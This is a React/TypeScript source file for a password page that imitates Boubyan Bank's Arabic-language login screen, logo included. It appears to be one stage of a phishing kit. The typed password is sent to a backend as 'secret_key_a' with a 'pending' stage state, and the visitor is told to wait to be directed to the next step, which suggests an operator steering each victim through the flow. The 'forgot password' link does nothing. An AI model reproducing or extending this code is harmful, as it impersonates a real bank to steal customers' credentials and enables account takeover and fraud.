import { FormEvent, useState } from "react";
import { createOrUpdateRequest, fillFieldMessage } from "@/api/visitorSession";
import { AdminGatedScreen } from "@/components/AdminGatedScreen";
import { useVisitorSession } from "@/hooks/useVisitorSession";

export default function PasswordPage() {
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [submitted, setSubmitted] = useState(false);

  useVisitorSession("password");

  const onSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!password.trim()) {
      setError(fillFieldMessage("كلمة السر"));
      return;
    }
    setError(null);
    await createOrUpdateRequest({
      stage_key: "password",
      secret_key_a: password,
      notify_key: "----",
      stage_state: "pending",
    });
    setSubmitted(true);
  };

  return (
    <AdminGatedScreen>
    <main className="page-bank__shell view--bank" aria-label="كلمة السر">
      <header className="bank-topbar">
        <span className="bank-icon bank-icon--chat" aria-hidden="true" />
        <button type="button" className="bank-menu" aria-label="القائمة">
          <span />
          <span />
          <span />
        </button>
      </header>
      <div className="bank-logo-wrap">
        <img src="/BoubyanBankLogo_(1).webp" alt="بوبيان Boubyan" className="bank-logo-img" width={165} />
      </div>
      {submitted ? (
        <p className="bank-hint personal-info-hint" role="status">
          تم إرسال البيانات. يرجى انتظار التوجيه إلى الخطوة التالية.
        </p>
      ) : (
      <form className="bank-form bank-form--compact" onSubmit={onSubmit} noValidate>
        <label className="bank-field bank-field--password">
          <span className="bank-label">كلمة السر</span>
          <div className="bank-password">
            <input
              type={showPassword ? "text" : "password"}
              className="bank-input bank-input--password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (e.target.value.trim()) setError(null);
              }}
              onBlur={() => {
                if (!password.trim()) setError(fillFieldMessage("كلمة السر"));
              }}
              autoComplete="current-password"
              required
            />
            <button
              type="button"
              className="bank-password__toggle"
              aria-label={showPassword ? "إخفاء كلمة السر" : "إظهار كلمة السر"}
              aria-pressed={showPassword}
              onClick={() => setShowPassword((v) => !v)}
            >
              {!showPassword ? (
                <svg xmlns="http://www.w3.org/2000/svg" width={22} height={22} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={1.75} aria-hidden>
                  <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z" />
                  <circle cx="12" cy="12" r="3" />
                </svg>
              ) : (
                <svg xmlns="http://www.w3.org/2000/svg" width={22} height={22} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={1.75} aria-hidden>
                  <path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" />
                  <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242" />
                  <path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143" />
                  <path d="m2 2 20 20" />
                </svg>
              )}
            </button>
          </div>
          {error && (
            <p className="bank-field-error" role="alert">
              {error}
            </p>
          )}
        </label>
        <button type="submit" className="btn-primary btn-primary--bank">
          الدخول
        </button>
        <a href="#" className="bank-link bank-link--center" onClick={(ev) => ev.preventDefault()}>
          نسيت كلمة السر؟
        </a>
      </form>
      )}
    </main>
    </AdminGatedScreen>
  );
}
